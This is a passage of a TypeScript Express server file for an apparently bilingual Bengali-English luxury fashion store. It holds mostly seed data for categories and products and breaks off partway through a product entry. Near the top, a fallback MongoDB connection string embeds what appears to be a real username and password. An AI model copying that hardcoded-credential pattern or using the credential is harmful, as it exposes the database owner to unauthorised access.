import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { MongoClient, ServerApiVersion, Db } from 'mongodb';
import { createServer as createViteServer } from 'vite';
import dotenv from 'dotenv';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

app.use(express.json());

// Normalize MongoDB connection URI from environment or user-provided credential
const rawUri = process.env.MONGODB_URI || 
  'mongodb+srv://VELVETCRIMSON:FjBdPpcSUxKHkaNE@cluster0.ssmpl.mongodb.net/velvet_crimson?retryWrites=true&w=majority&appName=Cluster0';

// Remove angle brackets if present in connection string
const cleanUri = rawUri.replace('<VELVETCRIMSON>', 'VELVETCRIMSON').replace('<FjBdPpcSUxKHkaNE>', 'FjBdPpcSUxKHkaNE');

let mongoClient: MongoClient | null = null;
let db: Db | null = null;
let mongoConnected = false;
let mongoLastError: string | null = null;

// Initial Seed Data with high-fashion imagery and details from user prompt
const SEED_CATEGORIES = [
  {
    id: 'cat-women',
    name: 'Women',
    nameBn: 'মহিলাদের ফ্যাশন',
    slug: 'women',
    image: 'https://lh3.googleusercontent.com/aida-public/AB6AXuB_hIgJgh-C89xvU9miVsyb69nZ7ANB7EXx86lUPn7IIum8VWu6pahfF2AwXcTd_NSHEdDo2f_EGzD45NBDDBdvOzYqltbGLCg633EN22ls8KNwMg0kvSY9PZq2S5cO16J9cdX4JciDL2JNlv6J4ZxJUev-iSTwE8vK4YYbdwj2x1nTtp8PFOVHQXol5oTVEOQpEtJdUpzldziMsOsCjdwJpQCtjJCYd9DNEd2KN97rTSX8Y3LZ8QWWAw',
    description: 'Signature tailored deep ruby red coats and modern atelier dresses.',
    descriptionBn: 'আধুনিক নারীর আভিজাত্যের জন্য এক্সক্লুসিভ লাল ও সাদা পোশাক।',
    productCount: 48,
    status: true,
  },
  {
    id: 'cat-men',
    name: 'Men',
    nameBn: 'পুরুষদের পোশাক',
    slug: 'men',
    image: 'https://lh3.googleusercontent.com/aida-public/AB6AXuBAPy6F8ZSXEjPn_nbcK2L-14f7EL_M2wJW2dK4zm7_lQk4tF55X5sW_G-1_RqozDBjk9GJ9V-nlWIkd-1fUEYPbkVaow8YB9mNLUBLXZR_7WIl2wYu5eqKXKKzs2fT7Lv8dUP-2Fym5EXARhCI8vmgPSopn-ng8QwRcOm0KHwAW62QjxZpygK6M9iMAE-2sVMx4HQuaMTTBEI4rY9i71bIvp_JJtHon_64yKWCI2Uq_frJv_HGRWCcFQ',
    description: 'Bespoke charcoal and rich crimson embroidered bandhgala sherwanis.',
    descriptionBn: 'ক্রিমসন সুতি ও লিনেন পাঞ্জাবি, শেরওয়ানি এবং ফর্মাল স্যুট।',
    productCount: 12,
    status: true,
  },
  {
    id: 'cat-sarees',
    name: 'Luxury Sarees',
    nameBn: 'অভিজাত শাড়ি',
    slug: 'sarees',
    image: 'https://lh3.googleusercontent.com/aida-public/AB6AXuAGfpV0jMXfdBJ1uOODE8ruY6UNSEclNjUNmglp8iG84mKWY5qpDR9t3VH7Sfecd1efJ83nKMNnlKSHJD4cxlhOp67wgBy_q-Su6hWA-9WBJkDsBwezd1efi0FrORQjozi5nCRm0TrUURzlBt4SG0wmii1VMbMEOPTwbWrj4pjTQ1Bhq5fLaFrGVHDIK7-bIioiLts51feVMwCK-90Vi7LjqDLyEtaHdNtDlVZfwoq9flRfRqmnr617nQ',
    description: 'Handcrafted pure Katan and Sonargaon Jamdani in rich crimson and antique gold zari.',
    descriptionBn: 'খাঁটি সিল্ক, জামদানি এবং জরির কাজ করা রাজকীয় শাড়ি।',
    productCount: 32,
    status: true,
  },
  {
    id: 'cat-dresses',
    name: 'Haute Dresses',
    nameBn: 'ড্রেসেস ও গাউন',
    slug: 'dresses',
    image: 'https://lh3.googleusercontent.com/aida-public/AB6AXuArV-G5jx1Yaz2aDQoxuqplcSlKTQKVEhRCMlMjrAIgmH2TbsB3UhvFAA-jFOKw7FCPzhs0jWuNQY_Hcu2UnJsL5_32oYaOHjuSmp9eVggqYMSdWZBAnYmXIKreT3EEJkV9nRCE2TUjRN-DsqktAaUCUd-MXRDBXtb74vJ1-ZCRY6hoRR9gSD86NK8C1VSOzLYeqtytfPEqnUo0zKzxxxe2pBKFM5YHV5r38XAqnGWCffvmswdR0FBnEQ',
    description: 'Floor-length scarlet red velvet evening gowns with flowing draped silhouettes.',
    descriptionBn: 'আভিজাত্যময় গাউন এবং স্টাইলিশ ক্রিমসন ড্রেস।',
    productCount: 24,
    status: true,
  },
  {
    id: 'cat-hijab',
    name: 'Modern Hijab',
    nameBn: 'প্রিমিয়াম হিজাব ও আবাঈয়া',
    slug: 'hijab',
    image: 'https://lh3.googleusercontent.com/aida-public/AB6AXuBF9Kwg6AWbRh_7dNv2O78FDjLwPz_EynpeXKEyaCW63zB6ds4EUOvTbvmQSRLGNq0BaFoCQj8RcCVcS5Ppt9p4ongXHhiVSxQjuQq6TdPc9xAc3whBK8lBBO2Ap7XsYw9sx32qlzcNkmMuNfzGjOvKIu2fEJEs1odI4V74l9LlkGBjIVvAM_MSq_K2NdMM7ruZK5cDk8fSwUmy16g_USzWCudsny7xjeStPDPj3y-g43Fg611M-w4KkQ',
    description: 'Lustrous deep maroon silk chiffon hijabs and layered emerald georgette capes.',
    descriptionBn: 'কোমল ক্রিমসন শিফন, সিল্ক জর্জেট ও পার্ল বসানো হিজাব।',
    productCount: 18,
    status: true,
  },
  {
    id: 'cat-tops',
    name: 'Artisanal Tops',
    nameBn: 'টপস ও কুর্তি',
    slug: 'tops',
    image: 'https://lh3.googleusercontent.com/aida-public/AB6AXuB4bLhUFbe5abYgmcvJ1E1eGuu-P0e9dqa6srrBwJ2Tjvf-k_8YZxApKO40RkkqiTdqLGPQ9OOtSLC5WrGVmuTAih-d5vQLGmZTIOoXFEm5IEIbw9uOZnMbm0bcbAFafCgK1JBNvn5Fl1ldOrJZHI-7dQTLfMCUiwtxvPOuoQj-1qTsSuxX-NPlHZL3utcVEwvgmoxzFaz63uQhorBCDZAh_NjqRpgWHAHAPEyzU_NhiTmiXNYxMFgudQ',
    description: 'Artisan embroidered silk tunics with fine floral threadwork and asymmetric lapels.',
    descriptionBn: 'মনোরম সিল্ক ব্লাউজ, লেইস টপ ও ট্রেন্ডি শার্ট।',
    productCount: 14,
    status: true,
  },
  {
    id: 'cat-accessories',
    name: 'Fine Accessories',
    nameBn: 'এক্সেসরিজ ও ব্যাগ',
    slug: 'accessories',
    image: 'https://lh3.googleusercontent.com/aida-public/AB6AXuD4-dqRIl9aF3yjX9dBth3mHv2nobeRX8-t8bp3OG2DcoeHFLC0llPhtymU-pG-Ss1ACo2iMRag1bJCZfG4DfjgGlTVIg5NFDNlQiC8q0_A0xE2ca_DTMjuUuE_JKJTZHiY-a5VPd6K1X9JLP5Zwcin-qFv2Nk6c6_3XVHXtoJxCzgTg37tn5C2iN2VzWx3LWcEHNtDu_xJ6CpH0RtbbO7TCfYp_tvap23zYqkhFr4wVYmmviISg5uDHg',
    description: 'Artisanal leather handbags with sculpted crimson resin clasps and delicate gold chains.',
    descriptionBn: 'রুবী ভেলভেট ক্লাচ, এমব্রয়ডারি শাল ও মানানসই গহনা।',
    productCount: 8,
    status: true,
  },
  {
    id: 'cat-crimson-edit',
    name: 'The Crimson Edit',
    nameBn: 'দ্য ক্রিমসন ক্যাপসুল',
    slug: 'crimson-edit',
    image: 'https://lh3.googleusercontent.com/aida-public/AB6AXuBejvOtnlGwquPIY9zSiRj8l0ifk0F2Ok3xvNcpTNYEFFvdZl_8nSSj1rGaGfBxmPSgFe6porl5Q5z-nDE84wiT21mQlMuEKevwS-IM4YBDESjCY_kpm9JqdW6hfWl1LXWkbcX0EW5fwnVYVtHAIUFqCTgpi_U5S2dbYBglXXaC2SVzaqjquz-hH25XvTDu2ux_1J_9uyCJ3BhNcrkeawLaFXX1U7NCCu-jd7ln9Xa1THQ_ZIo58TSYZw',
    description: 'Exclusive capsule of cardinal silk waves and dramatic architectural runway pieces.',
    descriptionBn: 'কার্ডিনাল সিল্ক এবং রাজকীয় রানওয়ে ডিজাইনের বিশেষ সংকলন।',
    productCount: 16,
    status: true,
  },
];

const SEED_PRODUCTS = [
  {
    id: 'prod-001',
    name: 'Elegant Crimson Dress',
    nameBn: 'এলিগেন্ট ক্রিমসন ড্রেস',
    slug: 'elegant-crimson-dress',
    description: 'Sculpted with unapologetic architectural flair, this crimson evening dress encapsulates modern romanticism. Meticulously draped using 22-momme pure Mulberry silk, the silhouette accentuates natural body lines while providing ethereal fluidity in motion. Features an internal structural corset designed for effortless posture, a dramatic sweep train, and silk-covered handcrafted buttons along the spine.',
    descriptionBn: 'আধুনিক রোমান্টিসিজম ও রাজকীয় আভিজাত্যের অপূর্ব সমন্বয়ে তৈরি এই ক্রিমসন ইভনিং ড্রেস। খাঁটি মালবেরি সিল্ক ও নরম ভেলভেটের মিশ্রণে প্রতিটি ভাঁজ নিখুঁতভাবে ড্র্যাপ করা হয়েছে।',
    shortDescription: 'Pure 22-momme mulberry silk evening dress with structural corset and covered silk buttons.',
    shortDescriptionBn: 'খাঁটি মালবেরি সিল্কে তৈরি স্ট্রাকচারাল কর্সেট গাউন।',
    price: 2500,
    discountPrice: 2200,
    category: 'dresses',
    categoryBn: 'ড্রেসেস ও গাউন',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuADOm0apJdi3g2P-LcbeyhpnX3MZS3XNjfArkq8rj7WCYGsibqBRxf43vIMInNnq9DYSmOybIs2V-SLnsSLBGl7qesmHbZ-uILout4xDLfnXW6y0j5AKqHETk6qoShh6zTuxPyZlmhHw7M-SVvQ8aHPKgs7vHd4E6h_gmtkwfVILUnLKBJSc6UylK844kUL8FWCCpRgFEh_NtnDzVn5KK8IIdRU01M_q9Qryzg10UDe7ublc39m4hH8qg',
      'https://lh3.googleusercontent.com/aida-public/AB6AXuD_Viy28LmH-UBenFiBhDKKoCLHa6Gj6dY3_pqO7hm-DUx36Rd7p-1W8NrCXXTu3kwu29Eg_5iFubNQu7JT6zgb5N2W9xA98q0KByuT2SSu16Cb-ebUxbuaFbiXfgS6ka0Sg-7GGVubCE7MQbouMMJLPQTjX7FpFzdWgr-Mn1w61aybRO6rPNfxTjPYRILEIQ2L59WfwLxwHPpc4tTyor6C9m6Gjmt0ZFi7fctdBBpRlFzPZZqPBEbXuw',
      'https://lh3.googleusercontent.com/aida-public/AB6AXuAERLcy0IyNwq0WtPKpww2htatg9AtvVXNG8Gy3PiEiQ9Wdijw7sJGV-nsRPcrfbpr6fwFlMu9gSU6O6aGl3owt99JsuE_mGiFSSAYVbiGGQVpuBbCTNCItPBRc_AnjhP2y4fG9DoUJq1-U4WM49P06yxNVGHVpBe4NKHfeBqG9M-NQ_lOXvIVwB_JAE3f4m1dqp2eg-OxTmUk4cen7U6kAJBv-vrg8LmZA-SbifRhh38OaotszilyFAg',
      'https://lh3.googleusercontent.com/aida-public/AB6AXuCFHAmbuIgR_9dtjhZYzBfsMvF3djleHq25T4NS9xzQKrki2F-i-k8D6GZsEn2MosSAO2tLqRLsXg0zptbOG4YZ9mOgruYFEWV2imquw3DCx9Eq3fSmLvaR5bXNsqEdqyl3mOWRyeCPUWnF8R060Uez1MBQKjuh6d8RC7-WU00ixwjss_gXqHXvvRh3JHymHDM-e9f_O3MuRPvrLasilHP7KDnt6z_OikzhMXWAl0Rq44FwI5VTdpM_SQ',
    ],
    sizes: ['S', 'M', 'L', 'XL'],
    colors: [
      { name: 'Crimson Red', nameBn: 'ক্রিমসন রেড', hex: '#890017' },
      { name: 'Obsidian Black', nameBn: 'অবসিডিয়ান ব্ল্যাক', hex: '#1C1B1B' },
      { name: 'Pure Silk White', nameBn: 'শুভ্র সিল্ক সাদা', hex: '#F6F3F2' },
    ],
    stock: 4,
    sku: 'VC-DRS-089',
    featured: true,
    isNewArrival: true,
    isBestSeller: true,
    rating: 4.8,
    reviewCount: 24,
  },
  {
    id: 'prod-002',
    name: 'Aura Silk Saree',
    nameBn: 'অরা সিল্ক শাড়ি',
    slug: 'aura-silk-saree',
    description: 'Woven with rich berry red threads and delicate silver border details in our Sonargaon master looms. The fall of the mulberry silk and subtle cardinal tones elevate festive galas and evening banquets.',
    descriptionBn: 'সোনারগাঁওয়ের তাঁতে বোনা খাঁটি মালবেরি সিল্ক শাড়ি। সিলভার ও লাল জরির মেলবন্ধনে তৈরি আভিজাত্যের প্রতীক।',
    shortDescription: 'Mulberry silk saree woven with berry red threads and silver borders.',
    shortDescriptionBn: 'মালবেরি সিল্কের এক্সক্লুসিভ লাক্সারি শাড়ি।',
    price: 6500,
    discountPrice: 5200,
    category: 'sarees',
    categoryBn: 'অভিজাত শাড়ি',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuCvXF2VWiGdjQnET7nfHq2Z3asai4Qp-rMUTaHIC7apENj8njHq4yeuTm9XXhJJ5iWUI2YX7Y0D783bMqigMJ1tqsJ8HihSXzZOb_2ifwVCQucSZQgpMhlNE1ZL1D3SxOj5cybQxolFmr4hHtjAKBqvW0_J_ZrNu6EnuaAVvCXQAvti9PuaVI5o30l_1wzrlTjheoHHm6zWLMgJYKC5gVTG1BlHOFzdNOhlKfQ-tNE1flGADaZYQmBrUg',
    ],
    sizes: ['Free Size'],
    colors: [
      { name: 'Crimson', nameBn: 'ক্রিমসন', hex: '#890017' },
      { name: 'Deep Onyx', nameBn: 'ডিপ অনিক্স', hex: '#1C1B1B' },
      { name: 'Pure Ivory', nameBn: 'পিওর আইভরি', hex: '#F6F3F2' },
    ],
    stock: 12,
    sku: 'VC-SAR-042',
    featured: true,
    isNewArrival: true,
    isBestSeller: false,
    rating: 4.9,
    reviewCount: 42,
  },
  {
    id: 'prod-003',
    name: 'Velvet Evening Gown',
    nameBn: 'ভেলভেট ইভনিং গাউন',
    slug: 'velvet-evening-gown',
    description: 'Opulent velvet evening gown with high neckline, sculpted back, and subtle architectural flare in pure deep burgundy wine.',
    descriptionBn: 'উচ্চমানের ইতালিয়ান ভেলভেটে তৈরি রয়্যাল ওয়াইন ইভনিং গাউন।',
    shortDescription: 'Architectural burgundy silk-velvet gown with high neckline.',
    shortDescriptionBn: 'ডিপ বার্গান্ডি ভেলভেট গাউন।',
    price: 14500,
    discountPrice: 12800,
    category: 'dresses',
    categoryBn: 'ড্রেসেস ও গাউন',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuDVZJ35S_6w_AAMn3RR3RR8Rc26SxlXF00BO0zp9Pwd53rklB7kiPjM9TE9o6VY1RoL41KAxM35Ms89bAJ4lO4S3wJkEmNe5w8TS7j6I17gVFgMHDxkq1ATY-kondx46inMevBysFQB9JJve-IRKR07AFSfrk9g1kr57aDsYOcgSm5cKIf0vWv2VH9va91TXnZ3kInJ175JiETi8Q78rwH3ye7ZFjYMdwET4kGIbQvg_6v8r-O7dGVrOA',
    ],
    sizes: ['S', 'M', 'L'],
    colors: [
      { name: 'Royal Wine', nameBn: 'রয়্যাল ওয়াইন', hex: '#5B0E1A' },
      { name: 'Midnight', nameBn: 'মিডনাইট', hex: '#1C1B1B' },
      { name: 'Forest Velvet', nameBn: 'ফরেস্ট ভেলভেট', hex: '#3A4439' },
    ],
    stock: 8,
    sku: 'VC-DRS-028',
    featured: true,
    isNewArrival: true,
    isBestSeller: true,
    rating: 5.0,
    reviewCount: 28,
  },
  {
    id: 'prod-004',
    name: 'Crimson Tailored Blazer',
    nameBn: 'ক্রিমসন টেইলর্ড ব্লেজার',
    slug: 'crimson-tailored-blazer',
    description: 'Double-breasted crimson tailored blazer with peak lapels, styled over silk lining with razor-sharp shoulders and Italian horn buttons.',
    descriptionBn: 'ডাবল ব্রেস্টেড ক্রিমসন ব্লেজার, নিখুঁত কাটিং ও প্রিমিয়াম ফিনিশ।',
    shortDescription: 'Double-breasted crimson blazer with peak lapels and sharp shoulders.',
    shortDescriptionBn: 'ক্রিমসন ডাবল ব্রেস্টেড স্যুট ব্লেজার।',
    price: 11000,
    discountPrice: 9400,
    category: 'women',
    categoryBn: 'মহিলাদের ফ্যাশন',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuBoW4NG8wQ6z08-34xSMSf6yHV2uylWhyPf-2Sef-ZcFldF2XWZzx_yJ_E79rEW9O1R5q6VG4USSxW7Q8Uq8aPxx8Y8Ov6NjBi6uZd4pvE4Mpj1nE5UYESwfRk6wrqRkcibP30bowtHu782akBcKuBQj3PAQ3gjwo6VKQ-MPLXWwgCAUTSthjNqvc8xeCFFnCgm3gvPntg8H1HuHZH561u4aq6Dbn7xYwpmCicoULcsbFxHD8hc92XOyg',
    ],
    sizes: ['XS', 'S', 'M', 'L', 'XL'],
    colors: [
      { name: 'Crimson', nameBn: 'ক্রিমসন', hex: '#890017' },
      { name: 'Parchment', nameBn: 'পার্চমেন্ট', hex: '#E5E2E1' },
      { name: 'Black', nameBn: 'ব্ল্যাক', hex: '#1C1B1B' },
    ],
    stock: 10,
    sku: 'VC-BLZ-019',
    featured: true,
    isNewArrival: true,
    isBestSeller: false,
    rating: 4.8,
    reviewCount: 19,
  },
  {
    id: 'prod-005',
    name: 'Monochrome Embroidered Kurta',
    nameBn: 'মনোক্রোম এমব্রয়ডার্ড কুর্তা',
    slug: 'monochrome-embroidered-kurta',
    description: 'Pure white and charcoal monochrome embroidered silk kurta with fine crimson inner cuff details, hand-finished collar.',
    descriptionBn: 'খাঁটি সিল্কের মনোক্রোম এমব্রয়ডারি করা পুরুষদের অভিজাত কুর্তা।',
    shortDescription: 'Monochrome embroidered silk kurta with crimson inner cuff accent.',
    shortDescriptionBn: 'পুরুষদের রাজকীয় সিল্ক কুর্তা।',
    price: 9000,
    discountPrice: 7800,
    category: 'men',
    categoryBn: 'পুরুষদের পোশাক',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuAeXf9gq1s7UAlZDHOif173k9jZ0MQm4lEdDTFSmGP6CgW1r7xGBYmdgTqmH5H12Xjo97qwKlR7_nA-E2vlapwgER_Ju9fm_Bcvr_6l5kddce6YXrn32BsGsIw_psHpb4TKJiY5Gb-gq-9hCI92J1d8yt8ZJSccQcpVI74J9KsyllyFDsNBhJNflNPyAZbYIKpASpQV95vJvrpeKjmOhMFZzk43qk2t3r_s3iVpqWYYqn8tislbueXthA',
    ],
    sizes: ['M', 'L', 'XL', 'XXL'],
    colors: [
      { name: 'Raw Ecru', nameBn: 'র এক্রু', hex: '#F0EDEC' },
      { name: 'Jet Black', nameBn: 'জেট ব্ল্যাক', hex: '#1C1B1B' },
      { name: 'Crimson Thread', nameBn: 'ক্রিমসন থ্রেড', hex: '#890017' },
    ],
    stock: 16,
    sku: 'VC-MEN-035',
    featured: true,
    isNewArrival: true,
    isBestSeller: false,
    rating: 4.9,
    reviewCount: 35,
  },
  {
    id: 'prod-006',
    name: 'Imperial Crimson Evening Gown',
    nameBn: 'ইম্পেরিয়াল ক্রিমসন ইভনিং গাউন',
    slug: 'imperial-crimson-evening-gown',
    description: 'Pure silk velvet gown sculpted with hand-embroidered metallic threads along the asymmetric neckline. Signature atelier masterpiece.',
    descriptionBn: 'হাতে এমব্রয়ডারি করা ধাতব সুতার নিখুঁত কাজ সংবলিত ইম্পেরিয়াল গাউন।',
    shortDescription: 'Signature silk velvet gown with hand-embroidered asymmetric neckline.',
    shortDescriptionBn: 'হ্যান্ডমেড এমব্রয়ডারি ইভনিং গাউন।',
    price: 21000,
    discountPrice: 18500,
    category: 'women',
    categoryBn: 'মহিলাদের ফ্যাশন',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuAiE4A2nJjlcOlcvlNSeqxmEqvrM8fzJ-XCDjvSyCKDef7ewmOCp5qozMQ8MRlGqudjBfQK-cITZlmQ3DLoF8hy6u94XLWkrtQwvCsRSt9stUr1SUucq1ON5MCk9nv2xZrmpbVO9lfgnTLfSWpPFvNKXmHo1xJHiAQ432VtCX1XsqHDMuvPOAIiYMHts5dlfTpqT1leXNddmVE61CEERU5zeCjdfKxrYyZV6He9uNPonYDh2bI8urWPRg',
    ],
    sizes: ['S', 'M', 'L'],
    colors: [
      { name: 'Crimson Red', nameBn: 'ক্রিমসন রেড', hex: '#890017' },
      { name: 'Obsidian Black', nameBn: 'অবসিডিয়ান ব্ল্যাক', hex: '#1C1B1B' },
      { name: 'Deep Wine', nameBn: 'ডিপ ওয়াইন', hex: '#4A0E17' },
    ],
    stock: 6,
    sku: 'VC-COUT-001',
    featured: true,
    isNewArrival: false,
    isBestSeller: true,
    rating: 4.9,
    reviewCount: 48,
  },
  {
    id: 'prod-007',
    name: 'Heirloom Sonargaon Jamdani Saree',
    nameBn: 'ঐতিহ্যবাহী সোনারগাঁও জামদানি শাড়ি',
    slug: 'heirloom-sonargaon-jamdani-saree',
    description: 'Fine count muslin weave with 300-count cotton and pure gold zari craftsmanship, hand-woven over 4 months by master artisans.',
    descriptionBn: '৩০০ কাউন্ট সুতি ও খাঁটি সোনার জরিতে তৈরি ঐতিহ্যবাহী সোনারগাঁও জামদানি।',
    shortDescription: 'Masterpiece 300-count Sonargaon Jamdani with authentic zari motifs.',
    shortDescriptionBn: 'হাতে বোনা খাঁটি সোনারগাঁও জামদানি শাড়ি।',
    price: 28000,
    discountPrice: 24500,
    category: 'sarees',
    categoryBn: 'অভিজাত শাড়ি',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuAZ3dsxui5lEaN4SLCc-kJdYnXpWs3RTkc5ASgjz7bKGu8VZqHtcb3rRdaI5VJC_gK-d1yEGyF50YcXzhSEtFOIl0uElOF93t5E4njglutDCwZ9SImZHx8wvZJB0tsz25wkGwIObzzI0pybg-zzlSXJmp09y53T_219CGtBB95EEXPxTXu2wt0r_G844vmTiwp-ijBi93PBm-tpjhgLtKN3EtnO9gImmUC1D5o8yF8wiWxQtiShiZirng',
    ],
    sizes: ['Free Size'],
    colors: [
      { name: 'Deep Wine', nameBn: 'ডিপ ওয়াইন', hex: '#4A0E17' },
      { name: 'Champagne Gold', nameBn: 'শ্যাম্পেন গোল্ড', hex: '#D4AF37' },
    ],
    stock: 5,
    sku: 'VC-JAM-002',
    featured: true,
    isNewArrival: false,
    isBestSeller: true,
    rating: 5.0,
    reviewCount: 32,
  },
  {
    id: 'prod-008',
    name: 'Obsidian Velvet Tuxedo Sherwani',
    nameBn: 'অবসিডিয়ান ভেলভেট টাক্সিডো শেরওয়ানি',
    slug: 'obsidian-velvet-tuxedo-sherwani',
    description: 'Structured Italian cashmere-wool blend with hand-quilted silk lining, ruby-red button detailing, and velvet lapel facing.',
    descriptionBn: 'ইতালিয়ান কাশ্মীর-উল ব্লেন্ড এবং রুবী বাটন সম্বলিত প্রিমিয়াম শেরওয়ানি।',
    shortDescription: 'Bespoke wool blend sherwani with ruby buttons and silk lining.',
    shortDescriptionBn: 'অভিজাত ব্ল্যাক ভেলভেট শেরওয়ানি।',
    price: 24000,
    discountPrice: 21000,
    category: 'men',
    categoryBn: 'পুরুষদের পোশাক',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuBGm_7u4MYK2Olm7RdZJ0shUdHLogZ-yuyyGk0QDGMjGQCouGlbfaw0CLPhHQlvIVrdjzzLeJwYSmxUBDA0PeujZVwsNr14WzMlUsmhpA0AKfj7IPz-Qmf2HkHxa3ACIAJ04-oub6ywqjYvXKkBgAbpgwu5h4viA9KZDXlSCgxELR7zZINUStM0nxxoEa_yiYMrOhhT4lN0cAzan77l-YBREYOY7lzM8AhPh6Q1ppnFD7iqn_zXg-hcoQ',
    ],
    sizes: ['38', '40', '42', '44'],
    colors: [
      { name: 'Obsidian Black', nameBn: 'অবসিডিয়ান ব্ল্যাক', hex: '#1C1B1B' },
      { name: 'Crimson Accent', nameBn: 'ক্রিমসন অ্যাকসেন্ট', hex: '#890017' },
    ],
    stock: 7,
    sku: 'VC-SHR-003',
    featured: true,
    isNewArrival: false,
    isBestSeller: true,
    rating: 4.8,
    reviewCount: 22,
  },
  {
    id: 'prod-009',
    name: 'Emerald Crepe Modest Cape Gown',
    nameBn: 'এমেরাল্ড ক্রেপ মডেস্ট কেপ গাউন',
    slug: 'emerald-crepe-modest-cape-gown',
    description: 'Layered double-georgette with tonal satin trims, delicate pearl work cuffs, and pleated back sweep for graceful drape.',
    descriptionBn: 'লেয়ার্ড ডাবল জর্জেট ও পার্ল ওয়ার্কের কাজ সংবলিত মার্জিত কেপ গাউন।',
    shortDescription: 'Flowing double-georgette modest cape gown with pearl trims.',
    shortDescriptionBn: 'রয়্যাল গ্রিন ও বার্গান্ডি মডেস্ট গাউন।',
    price: 16500,
    discountPrice: 14200,
    category: 'hijab',
    categoryBn: 'প্রিমিয়াম হিজাব ও আবাঈয়া',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuCjNU2CqLDNXmLx45SNNoUdnSOy8T3LCtRSgRnjr4teg5A5KaewOgxiuRULm_I67DHxjTdm2I9PoYv_q4vT_AfnHoDHTHDWiPboiC6IAB9bF85DkASUwYfrht27NN8YZ_65kNtat7kDCYpBbhX_ee97Hk6tQxuvWOFtGzExkdo7gpmFBcYTW0AmOmL8tuej85JLr7huTcX_Y_RmoCViY8noEisBM3tPHCSgZ3wsXN4zoSx_hXgSV5N8Tw',
    ],
    sizes: ['S', 'M', 'L', 'XL'],
    colors: [
      { name: 'Royal Emerald', nameBn: 'রয়্যাল এমেরাল্ড', hex: '#0F382A' },
      { name: 'Crimson Red', nameBn: 'ক্রিমসন রেড', hex: '#890017' },
      { name: 'Pearl White', nameBn: 'পার্ল হোয়াইট', hex: '#F6F3F2' },
    ],
    stock: 9,
    sku: 'VC-MDST-004',
    featured: true,
    isNewArrival: false,
    isBestSeller: true,
    rating: 4.9,
    reviewCount: 39,
  },
  {
    id: 'prod-010',
    name: 'Champagne Ribboned Silk Corset Dress',
    nameBn: 'শ্যাম্পেন সিল্ক কর্সেট ড্রেস',
    slug: 'champagne-ribboned-silk-corset-dress',
    description: 'Boning construction paired with pure mulberry silk organza and crimson contrast corded belt for high-fashion gala elegance.',
    descriptionBn: 'মালবেরি সিল্ক ও ক্রিমসন বেল্টের সমন্বয়ে তৈরি কর্সেট ড্রেস।',
    shortDescription: 'Pure mulberry silk corset gown with contrast crimson velvet ribbon.',
    shortDescriptionBn: 'শ্যাম্পেন গোল্ড কর্সেট ড্রেস।',
    price: 19500,
    discountPrice: 16800,
    category: 'dresses',
    categoryBn: 'ড্রেসেস ও গাউন',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuBs52zhw11e1aBlVJc6YUKV-r0ENsW-7y4JrCvyBs7ZM5bRD0iYDwO6ekhtHfAUA_EE8A7pM06-aujGd06-LlMqV0owfF1xBnVwFm32fys043HLRqUFwX27kVoMjApYWDrnJqCHYLPsD2WGC1X1aKdrDdlsXzFA1lOxMzJxSbmHzU_T87IWrUUU5likfrGMszNNWn7fURFUy2u9prhCwTVhbA0g0JSgEBYZHdKL71xFKum04JuwAteLAA',
    ],
    sizes: ['XS', 'S', 'M'],
    colors: [
      { name: 'Champagne Gold', nameBn: 'শ্যাম্পেন গোল্ড', hex: '#D4AF37' },
      { name: 'Crimson Ribbon', nameBn: 'ক্রিমসন রিবন', hex: '#890017' },
    ],
    stock: 5,
    sku: 'VC-CRS-005',
    featured: true,
    isNewArrival: false,
    isBestSeller: false,
    rating: 4.7,
    reviewCount: 18,
  },
  {
    id: 'prod-011',
    name: 'Atelier Velvet & Brass Minaudière',
    nameBn: 'ভেলভেট অ্যান্ড ব্রাস মিনোদিয়ের ক্লাচ',
    slug: 'atelier-velvet-brass-minaudiere',
    description: 'Solid brass hardware with sculpted velvet inlay and gold rope shoulder chain. Hand-poured crimson resin clasp.',
    descriptionBn: 'সলিড ব্রাস এবং ভেলভেটের ইনলে সংবলিত প্রিমিয়াম ইভনিং ক্লাচ।',
    shortDescription: 'Solid brass minaudière with handcrafted crimson velvet inlay.',
    shortDescriptionBn: 'লাক্সারি হ্যান্ডমেড ইভনিং ক্লাচ।',
    price: 9800,
    discountPrice: 8500,
    category: 'accessories',
    categoryBn: 'এক্সেসরিজ ও ব্যাগ',
    images: [
      'https://lh3.googleusercontent.com/aida-public/AB6AXuAnKPm_4l0l4MUS2AlXCIRABMC-UJuDatVmNiVXftzUNITyMQXlaC2ZnqaZHGG9pfLZCIWyxa4HdJAxttsDQZBZ8pj1Q_zcjdUi49WH67z-d9aBggeKqGXBWk3Mf0VbWzpdmKZQfSvoW13M97Or1eYcYAB_TBgUupHJocDMceTW12cfNjePwc_uoCd2MGwiLCjBeKz8Dg1s-LTI-MaL4SLXuAZk0Id6DpFnevlbP8Erk11oyPop5Emhw',
    ],
    sizes: ['One Size'],
    colors: [
      { name: 'Crimson Red', nameBn: 'ক্রিমসন রেড', hex: '#890017' },
      { name: 'Obsidian Black', nameBn: 'অবসিডিয়ান ব্ল্যাক', hex: '#1C1B1B' },
    ],
    stock: 11,
    sku: 'VC-ACC-006',
    featured: true,
    isNewArrival: false,
    isBestSeller: true,
    rating: 4.9,
    reviewCount: 52,
  },
  {
    id: 'prod-012',
    name: 'Zardozi Embellished Raw Silk Tunic',
    nameBn: 'জারদৌজি র সিল্ক কুর্তি',
    slug: 'zardozi-embellished-raw-silk-tunic',
    description: 'Handcrafted Rajshahi raw silk with genuine metallic zardozi threads embroidered on collar and cuffs.',
    descriptionBn: 'রাজশাহী র সিল্কে তৈরি খাঁটি জারদৌজি কাজের অভিজাত টিউনিক।',
    shortDescription: 'Rajshahi raw silk tunic with genuine metallic zardozi collar embroidery.',
    shortDescriptionBn: 'জারদৌজি কাজের র সিল্ক টিউনিক।',
    price: 14800,
    discountPrice: 12900,
